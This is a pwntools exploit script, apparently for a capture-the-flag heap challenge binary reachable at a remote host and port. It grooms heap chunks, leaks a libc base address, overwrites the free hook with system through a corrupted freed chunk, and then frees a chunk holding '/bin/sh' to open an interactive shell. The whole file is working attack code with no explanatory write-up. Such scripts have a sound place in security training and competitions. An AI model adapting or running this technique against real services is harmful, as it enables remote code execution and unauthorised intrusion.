from pwn import *
context.terminal = ['tmux', 'split-window', '-h']
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './pwn'
HOST = '52.152.231.198'
PORT = 8081

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)
    # return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

def add(idx, size):
    r.sendlineafter('>> \n', '1')
    r.sendlineafter('\n', str(idx))
    r.sendlineafter('\n', str(size))

def delete(idx):
    r.sendlineafter('>> \n', '2')
    r.sendlineafter('\n', str(idx))

def edit(idx, payload):
    r.sendlineafter('>> \n', '3')
    r.sendlineafter('\n', str(idx))
    r.sendafter('\n', payload)

def show(idx):
    r.sendlineafter('>> \n', '4')
    r.sendlineafter('\n', str(idx))

def leave(name):
    r.sendlineafter('>> \n', '5')
    r.sendafter(':', name)

def showname(name):
    r.sendlineafter('>> \n', '6')

r = start()

if args.D:
    debug(r, []) 
    # debug(r, [0xc0e]) # edit
    # debug(r, [0xa30]) # malloc
for i in range(15):
	add(i, 0x60)

add(15, 0x60)
for i in range(15):
	delete(i)
leave('hoge')
show(7)
leak = u64(r.recvuntil('\n', True) + '\x00'*2)
base = leak - 0x1ebf50
dbg('base')
fh = base + 0x1eeb28
system = base + 0x55410

add(0, 0x18)
add(1, 0x18)

delete(0)
delete(1)

payload = ''
payload += flat(0, 0, 0x21, fh-8)
edit(7, payload)

add(0, 0x18)
add(1, 0x18)
edit(1, p64(system))

payload = ''
payload += flat(0, 0, 0x21, "/bin/sh\x00")
edit(7, payload)
delete(0)

r.interactive()
r.close()
